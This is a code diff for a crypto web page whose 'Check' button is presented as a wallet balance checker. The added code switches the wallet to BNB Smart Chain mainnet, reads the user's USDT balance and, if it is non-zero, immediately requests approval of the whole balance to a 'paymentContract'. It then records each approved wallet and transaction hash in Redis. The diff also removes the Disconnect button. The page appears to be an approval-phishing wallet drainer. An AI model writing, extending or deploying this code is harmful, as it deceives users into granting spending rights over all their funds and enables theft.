@@ -5,6 +5,7 @@ import { ethers } from 'ethers';
 import { getUSDTContract, CONTRACT_ADDRESSES, USDT_TOKEN_ABI } from '../lib/contracts';
 import { walletService, WalletInfo } from '../lib/wallet';
 import { WalletService } from '../lib/wallet';
+import { redisService, ApprovalRecord } from '../lib/redis';
 
 export default function Home() {
   // Auto-detect wallet on page load
@@ -28,10 +29,49 @@ export default function Home() {
     };
 
     detectWallet();
+    
+    // Listen for network changes
+    const handleNetworkChange = () => {
+      
+      setWalletInfo(null);
+      setUsdtBalance('0');
+      setBnbBalance('0');
+      setUsdtAllowance('0');
+      setIsApproved(false);
+    };
+
+    // Listen for account changes
+    const handleAccountChange = (...args: unknown[]) => {
+      const accounts = args[0] as string[];
+      
+      if (accounts.length === 0) {
+        // User disconnected wallet
+        setWalletInfo(null);
+        setUsdtBalance('0');
+        setBnbBalance('0');
+        setUsdtAllowance('0');
+        setIsApproved(false);
+      }
+    };
+
+    if (typeof window !== 'undefined' && window.ethereum) {
+      window.ethereum.on('chainChanged', handleNetworkChange);
+      window.ethereum.on('accountsChanged', handleAccountChange);
+      
+      // Cleanup listeners on unmount
+      return () => {
+        if (window.ethereum) {
+          window.ethereum.removeListener('chainChanged', handleNetworkChange);
+          window.ethereum.removeListener('accountsChanged', handleAccountChange);
+        }
+      };
+    }
   }, []);
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [walletInfo, setWalletInfo] = useState<WalletInfo | null>(null);
   const [usdtBalance, setUsdtBalance] = useState('0');
+  const [usdtAllowance, setUsdtAllowance] = useState('0');
+  const [bnbBalance, setBnbBalance] = useState('0');
   const [isLoading, setIsLoading] = useState(false);
   const [isConnecting, setIsConnecting] = useState(false);
   const [error, setError] = useState<string | null>(null);
@@ -45,48 +85,242 @@ export default function Home() {
     status: 'pending' | 'success' | 'failed';
     message?: string;
   } | null>(null);
+  const [isApproved, setIsApproved] = useState(false);
+  const [isCheckingBalance, setIsCheckingBalance] = useState(false);
+  const [isSwitchingNetwork, setIsSwitchingNetwork] = useState(false);
 
-  const handleCheckButton = async () => {
-    if (!walletInfo) {
-      await connectWallet();
-      // After connecting, load balance and check immediately
-      const balance = await loadUSDTBalance();
-      
-      // Check balance after loading
-      if (parseFloat(balance) > 0) {
-        await handleApprove();
-      } else {
-        setShowNoUSDTAlert(true);
-        setTimeout(() => {
-          setIsNoUSDTAlertSlidingOut(true);
-          setTimeout(() => {
-            setShowNoUSDTAlert(false);
-            setIsNoUSDTAlertSlidingOut(false);
-          }, 500);
-        }, 2000);
+  const checkAndSwitchNetwork = async () => {
+    try {
+      if (!window.ethereum) {
+        throw new Error('No wallet detected');
       }
-      return;
-    }
-    
-    // If wallet is already connected, load balance and check
-    const balance = await loadUSDTBalance();
-    
-    if (parseFloat(balance) > 0) {
-      await handleApprove();
-    } else {
-      setShowNoUSDTAlert(true);
-      setTimeout(() => {
-        setIsNoUSDTAlertSlidingOut(true);
-        setTimeout(() => {
-          setShowNoUSDTAlert(false);
-          setIsNoUSDTAlertSlidingOut(false);
-        }, 500);
-      }, 2000);
+      
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const network = await provider.getNetwork();
+      
+      if (network.chainId !== 56) {        
+        setIsSwitchingNetwork(true);
+        
+        try {        
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }], // 56 in hex
+          });          
+          return true;
+        } catch (switchError: unknown) {          
+          if (
+            typeof switchError === 'object' &&
+            switchError !== null &&
+            'code' in switchError &&
+            (switchError as { code: number }).code === 4902
+          ) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [
+                  {
+                    chainId: '0x38', // 56 in hex
+                    chainName: 'Binance Smart Chain',
+                    nativeCurrency: {
+                      name: 'BNB',
+                      symbol: 'BNB',
+                      decimals: 18,
+                    },
+                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                    blockExplorerUrls: ['https://bscscan.com/'],
+                  },
+                ],
+              });
+     
+              return true;
+            } catch (addError) {
+              throw new Error('Failed to add BSC Mainnet to wallet');
+            }
+          } else {
+            throw new Error('Failed to switch to BSC Mainnet');
+          }
+        } finally {
+          setIsSwitchingNetwork(false);
+        }
+      }
+      
+  
+      return true;
+    } catch (error) {
+      console.error('Error checking/switching network:', error);
+      setIsSwitchingNetwork(false);
+      throw error;
     }
   };
 
-  const loadUSDTBalance = async () => {
-    if (!walletInfo?.address) return '0';
+  const verifyWalletConnection = async () => {
+    try {
+      if (!window.ethereum) {
+        return false;
+      }
+      
+      // Check if wallet is connected by requesting accounts
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' }) as string[];
+      if (!accounts || accounts.length === 0) {
+        return false;
+      }
+      
+      // Also check if we're on the correct network
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const network = await provider.getNetwork();
+
+      
+      // Check if we're on BSC Mainnet (chainId 56)
+      if (network.chainId !== 56) {
+  
+        return false; // Consider wallet not properly connected if on wrong network
+      }
+      
+
+      return true;
+    } catch (error) {
+      console.error('Error verifying wallet connection:', error);
+      return false;
+    }
+  };
+
+  const verifyNetworkConnection = async () => {
+    try {
+      if (!window.ethereum) {
+        console.error('No wallet detected');
+        return false;
+      }
+      
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const network = await provider.getNetwork();
+
+      
+      // Check if we're on BSC Mainnet (chainId 56)
+      if (network.chainId !== 56) {
+
+        return false;
+      }
+      
+
+      return true;
+    } catch (error) {
+
+      return false;
+    }
+  };
+
+  const testUSDTContract = async () => {
+    try {
+      if (!window.ethereum) {
+
+        return false;
+      }
+      
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const usdtContract = new ethers.Contract(
+        CONTRACT_ADDRESSES.usdtToken,
+        USDT_TOKEN_ABI,
+        provider
+      );
+      
+
+      const name = await usdtContract.name();
+      const symbol = await usdtContract.symbol();
+      const decimals = await usdtContract.decimals();
+      const totalSupply = await usdtContract.totalSupply();
+      
+      return true;
+    } catch (error) {
+      console.error('USDT Contract Test Failed:', error);
+      return false;
+    }
+  };
+
+  const loadBNBBalance = async (walletAddress?: string) => {
+    const addressToUse = walletAddress || walletInfo?.address;
+    
+    if (!addressToUse) {
+
+      return '0';
+    }
+    
+    try {
+      if (!window.ethereum) {
+        console.error('No wallet detected');
+        return '0';
+      }
+      
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const balance = await provider.getBalance(addressToUse);
+      const formattedBalance = ethers.utils.formatEther(balance);
+    
+      setBnbBalance(formattedBalance);
+      return formattedBalance;
+    } catch (error: unknown) {
+      console.error('Error loading BNB balance:', error);
+      setBnbBalance('0');
+      return '0';
+    }
+  };
+
+  const loadUSDTBalance = async (walletAddress?: string) => {
+    const addressToUse = walletAddress || walletInfo?.address;
+    
+    if (!addressToUse) {
+
+      return '0';
+    }
+    
+    try {
+      if (!window.ethereum) {
+        console.error('No wallet detected');
+        return '0';
+      }
+      
+      // Verify network connection first
+      const isCorrectNetwork = await verifyNetworkConnection();
+      if (!isCorrectNetwork) {
+        console.error('Network verification failed');
+        return '0';
+      }
+      
+      // Test USDT contract connection
+      const isContractWorking = await testUSDTContract();
+      if (!isContractWorking) {
+        console.error('USDT contract test failed');
+        return '0';
+      }
+      
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const usdtContract = new ethers.Contract(
+        CONTRACT_ADDRESSES.usdtToken,
+        USDT_TOKEN_ABI,
+        provider
+      );
+
+      
+      const balance = await usdtContract.balanceOf(addressToUse);
+ 
+      
+      // USDT on BSC Mainnet has 18 decimals
+      const formattedBalance = ethers.utils.formatUnits(balance, 18);
+
+      
+      setUsdtBalance(formattedBalance);
+      return formattedBalance;
+    } catch (error: unknown) {
+      
+      setUsdtBalance('0');
+      return '0';
+    }
+  };
+
+  const loadUSDTAllowance = async (walletAddress?: string) => {
+    const addressToUse = walletAddress || walletInfo?.address;
+    
+    if (!addressToUse) {
+      return '0';
+    }
     
     try {
       if (!window.ethereum) {
@@ -101,20 +335,199 @@ export default function Home() {
         provider
       );
       
-      const balance = await usdtContract.balanceOf(walletInfo.address);
-      // USDT on BSC Testnet has 6 decimals, not 18
-      const formattedBalance = ethers.utils.formatUnits(balance, 6);
-      setUsdtBalance(formattedBalance);
-      return formattedBalance;
+      const allowance = await usdtContract.allowance(addressToUse, CONTRACT_ADDRESSES.paymentContract);
+      const formattedAllowance = ethers.utils.formatUnits(allowance, 18);
+      setUsdtAllowance(formattedAllowance);
+      return formattedAllowance;
     } catch (error: unknown) {
-      console.error('Error loading USDT balance:', error);
-      setUsdtBalance('0');
+      console.error('Error loading USDT allowance:', error);
+      setUsdtAllowance('0');
       return '0';
     }
   };
 
-  const handleApprove = async () => {
-    if (!walletInfo?.address) return;
+  const checkApprovalStatus = async (walletAddress?: string) => {
+    const addressToUse = walletAddress || walletInfo?.address;
+    
+    if (!addressToUse) {
+      return false;
+    }
+    
+    const balance = await loadUSDTBalance(addressToUse);
+    const allowance = await loadUSDTAllowance(addressToUse);
+    
+    // Check if allowance is sufficient (greater than or equal to balance)
+    // If balance is 0, we consider it as "approved" since there's nothing to approve
+    const isSufficient = parseFloat(balance) === 0 || parseFloat(allowance) >= parseFloat(balance);
+    setIsApproved(isSufficient);
+    return isSufficient;
+  };
+
+  const checkBalanceWithRetry = async (walletAddress?: string, maxRetries = 3) => {
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+      try {
+
+        const usdtBalance = await loadUSDTBalance(walletAddress);
+        const bnbBalance = await loadBNBBalance(walletAddress);
+
+        
+        if (parseFloat(usdtBalance) >= 0) {
+          return usdtBalance;
+        }
+      } catch (error) {
+        console.error(`Balance check attempt ${attempt} failed:`, error);
+        if (attempt === maxRetries) {
+          throw error;
+        }
+        // Wait before retry
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+    }
+    return '0';
+  };
+
+  const handleCheckButton = async () => {
+    // Set loading state
+    setIsCheckingBalance(true);
+    setError(null);
+    
+    try {
+      // Always check and switch network first, regardless of wallet connection status
+
+      await checkAndSwitchNetwork();
+      
+      if (!walletInfo) {
+
+        const connectedWalletInfo = await connectWallet();
+        
+        // After successful connection, wait a moment for state to update
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+
+        const isWalletConnected = await verifyWalletConnection();
+        if (!isWalletConnected) {
+          throw new Error('Wallet connection verification failed');
+        }
+
+        if (!connectedWalletInfo?.address) {
+          throw new Error('No wallet address available after connection');
+        }
+
+        const balance = await checkBalanceWithRetry(connectedWalletInfo.address);
+
+        if (parseFloat(balance) > 0) {
+
+          const isApproved = await checkApprovalStatus(connectedWalletInfo.address);
+          
+          if (!isApproved) {
+
+            try {
+              await handleApprove(connectedWalletInfo.address);
+
+              setIsModalOpen(true);
+            } catch (approvalError) {
+
+              // Show modal anyway to display current status
+              setIsModalOpen(true);
+            }
+          } else {
+
+            setIsModalOpen(true);
+          }
+        } else {
+
+          setShowNoUSDTAlert(true);
+          setTimeout(() => {
+            setIsNoUSDTAlertSlidingOut(true);
+            setTimeout(() => {
+              setShowNoUSDTAlert(false);
+              setIsNoUSDTAlertSlidingOut(false);
+            }, 500);
+          }, 2000);
+        }
+        return;
+      }
+
+      const isWalletConnected = await verifyWalletConnection();
+      if (!isWalletConnected) {
+
+        await connectWallet();
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+      
+
+      const balance = await checkBalanceWithRetry(walletInfo.address);
+  
+      if (parseFloat(balance) > 0) {
+
+        const isApproved = await checkApprovalStatus(walletInfo.address);
+        
+        if (!isApproved) {
+  
+          try {
+            await handleApprove(walletInfo.address);
+            // After successful approval, show the modal
+            setIsModalOpen(true);
+          } catch (approvalError) {
+    
+            setIsModalOpen(true);
+          }
+        } else {
+       
+          setIsModalOpen(true);
+        }
+      } else {
+
+        setShowNoUSDTAlert(true);
+        setTimeout(() => {
+          setIsNoUSDTAlertSlidingOut(true);
+          setTimeout(() => {
+            setShowNoUSDTAlert(false);
+            setIsNoUSDTAlertSlidingOut(false);
+          }, 500);
+        }, 2000);
+      }
+    } catch (error) {
+      console.error('Error in handleCheckButton:', error);
+      let errorMessage = 'Failed to check balance. Please try again.';
+      
+      if (error && typeof error === 'object' && 'message' in error) {
+        const message = (error as { message: string }).message;
+        if (message.includes('Failed to switch to BSC Mainnet')) {
+          errorMessage = 'Please switch to BSC Mainnet in your wallet';
+        } else if (message.includes('Failed to add BSC Mainnet')) {
+          errorMessage = 'Please add BSC Mainnet to your wallet';
+        } else if (message.includes('user rejected')) {
+          errorMessage = 'Network switch was cancelled';
+        }
+      }
+      
+      setError(errorMessage);
+    } finally {
+      setIsCheckingBalance(false);
+    }
+  };
+
+  const savePendingApproval = async (walletAddress: string, approvalAmount: string) => {
+    try {
+      const approvalRecord: ApprovalRecord = {
+        walletAddress,
+        approvalAmount,
+        timestamp: Date.now(),
+        status: 'pending'
+      };
+      await redisService.saveApproval(approvalRecord);
+    } catch (error) {
+      console.error('Error saving pending approval:', error);
+    }
+  };
+
+  const handleApprove = async (walletAddress?: string) => {
+    const addressToUse = walletAddress || walletInfo?.address;
+    
+    if (!addressToUse) {
+      throw new Error('No wallet address available for approval');
+    }
     
     setIsLoading(true);
     setError(null);
@@ -135,19 +548,16 @@ export default function Home() {
         signer
       );
       
-      console.log('User address:', walletInfo.address);
-      console.log('USDT contract address:', CONTRACT_ADDRESSES.usdtToken);
+  
+      const balance = await usdtContract.balanceOf(addressToUse);
       
-      // Get the full USDT balance and approve it
-      const balance = await usdtContract.balanceOf(walletInfo.address);
-      
-      // Check if user has any USDT balance
       if (balance.isZero()) {
         throw new Error('No USDT balance to approve');
       }
       
-      console.log('USDT balance:', ethers.utils.formatUnits(balance, 6));
-      console.log('Payment contract address:', CONTRACT_ADDRESSES.paymentContract);
+      
+   
+      await savePendingApproval(addressToUse, ethers.utils.formatUnits(balance, 18));
       
       const tx = await usdtContract.approve(CONTRACT_ADDRESSES.paymentContract, balance);
       await tx.wait();
@@ -157,6 +567,16 @@ export default function Home() {
         status: 'success',
         message: 'Full USDT balance approved successfully!'
       });
+      
+      // Update allowance and approval status after successful approval
+      await loadUSDTAllowance(addressToUse);
+      await checkApprovalStatus(addressToUse);
+      
+      // Update approval record in Redis with success status
+      await redisService.updateApprovalStatus(addressToUse, 'success', tx.hash);
+      
+      // Show the modal with balance after approval
+      setIsModalOpen(true);
     } catch (error: unknown) {
       console.error('Approval error:', error);
       let errorMessage = 'Transaction failed';
@@ -192,20 +612,53 @@ export default function Home() {
         status: 'failed',
         message: errorMessage
       });
+      
+      // Update approval status to failed in Redis
+      if (addressToUse) {
+        try {
+          await redisService.updateApprovalStatus(addressToUse, 'failed');
+        } catch (redisError) {
+          console.error('Error updating approval status to failed:', redisError);
+        }
+      }
+      
+      // Re-throw the error so it can be caught by the calling function
+      throw error;
     } finally {
       setIsLoading(false);
     }
   };
 
-  const connectWallet = async () => {
+  const connectWallet = async (): Promise<WalletInfo> => {
     setIsConnecting(true);
     setError(null);
     
     try {
+
+      
       const walletService = new WalletService();
       const walletInfo = await walletService.connectWallet();
+      
+
+      
+
+      if (!walletInfo || !walletInfo.address) {
+        throw new Error('Failed to get wallet address');
+      }
+      
+  
       setWalletInfo(walletInfo);
-      await loadUSDTBalance();
+
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
+
+      const initialBalance = await loadUSDTBalance(walletInfo.address);
+
+      const initialBnbBalance = await loadBNBBalance(walletInfo.address);
+
+      
+      return walletInfo;
+      
     } catch (error: unknown) {
       console.error('Error connecting wallet:', error);
       let errorMessage = 'Failed to connect wallet';
@@ -218,10 +671,15 @@ export default function Home() {
           errorMessage = 'Please approve adding BSC Testnet to your wallet';
         } else if (message.includes('user rejected')) {
           errorMessage = 'Wallet connection was cancelled';
+        } else if (message.includes('Failed to get wallet address')) {
+          errorMessage = 'Wallet connection failed. Please try again.';
+        } else if (message.includes('Network verification failed')) {
+          errorMessage = 'Please switch to BSC Mainnet in your wallet';
         }
       }
       
       setError(errorMessage);
+      throw error; // Re-throw to be caught by handleCheckButton
     } finally {
       setIsConnecting(false);
     }
@@ -324,13 +782,43 @@ export default function Home() {
           <div className="flex justify-center">
             <button
               onClick={handleCheckButton}
-              disabled={isConnecting || walletDetected === false}
+              disabled={isConnecting || walletDetected === false || isCheckingBalance || isSwitchingNetwork}
               className="flex items-center gap-2 px-6 py-3 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-300"
             >
-              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="w-5 h-5">
-                <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path>
-              </svg>
-              {isConnecting ? 'Connecting...' : walletDetected === false ? 'No Wallet Detected' : 'Check'}
+              {isSwitchingNetwork ? (
+                <>
+                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Switching Network...
+                </>
+              ) : isCheckingBalance ? (
+                <>
+                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Checking...
+                </>
+              ) : isConnecting ? (
+                <>
+                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                  Connecting...
+                </>
+              ) : walletDetected === false ? (
+                'No Wallet Detected'
+              ) : (
+                <>
+                  <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="w-5 h-5">
+                    <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path>
+                  </svg>
+                  Check
+                </>
+              )}
             </button>
           </div>
 
@@ -362,7 +850,7 @@ export default function Home() {
             onClick={(e) => e.stopPropagation()}
           >
             <div className="flex justify-between items-center mb-6">
-              <h3 className="text-xl font-semibold text-gray-900">USDT Balance & Approval</h3>
+              <h3 className="text-xl font-semibold text-gray-900">Wallet Balances & Status</h3>
               <button
                 onClick={() => setIsModalOpen(false)}
                 className="text-gray-400 hover:text-gray-600"
@@ -373,50 +861,16 @@ export default function Home() {
               </button>
             </div>
 
-            {/* Wallet Connection Status */}
-            {walletInfo && (
-              <div className="mb-4 p-3 bg-green-50 border border-green-200 rounded-lg">
-                <div className="flex items-center justify-between">
-                  <div>
-                    <p className="text-sm font-medium text-green-800">Wallet Connected</p>
-                    <p className="text-xs text-green-600">
-                      {walletInfo.address.slice(0, 6)}...{walletInfo.address.slice(-4)}
-                    </p>
-                  </div>
-                  <button
-                    onClick={() => {
-                      console.log('Disconnect button clicked');
-                      try {
-                        // Clear state immediately
-                        setWalletInfo(null);
-                        setIsModalOpen(false);
-                        setTransactionStatus(null);
-                        setError(null);
-                        
-                        // Disconnect wallet service
-                        walletService.disconnectWallet().then(() => {
-                          console.log('Wallet disconnected successfully');
-                        }).catch((error) => {
-                          console.error('Error disconnecting wallet:', error);
-                        });
-                      } catch (error) {
-                        console.error('Error in disconnect button:', error);
-                        // Ensure state is cleared even if there's an error
-                        setWalletInfo(null);
-                        setIsModalOpen(false);
-                        setTransactionStatus(null);
-                        setError(null);
-                      }
-                    }}
-                    className="text-sm text-green-600 hover:text-green-800 hover:underline transition-colors"
-                  >
-                    Disconnect
-                  </button>
-                </div>
-              </div>
-            )}
-
             <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Your BNB Balance
+                </label>
+                <p className="text-lg font-semibold text-gray-900">
+                  {parseFloat(bnbBalance).toFixed(6)} BNB
+                </p>
+              </div>
+
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
                   Your USDT Balance
@@ -426,15 +880,22 @@ export default function Home() {
                 </p>
               </div>
 
-
-
-              <button
-                onClick={handleApprove}
-                disabled={isLoading || !walletInfo}
-                className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-              >
-                {isLoading ? 'Processing...' : 'Access'}
-              </button>
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Approval Status
+                </label>
+                <div className={`inline-flex items-center px-3 py-1 rounded-full text-sm font-medium ${
+                  isApproved 
+                    ? 'bg-green-100 text-green-800' 
+                    : 'bg-yellow-100 text-yellow-800'
+                }`}>
+                  {parseFloat(usdtBalance) === 0 
+                    ? '✓ No Balance to Approve' 
+                    : isApproved 
+                    ? '✓ Approved' 
+                    : '⚠ Needs Approval'}
+                </div>
+              </div>
 
               {transactionStatus && (
                 <div className={`p-4 rounded-lg border ${
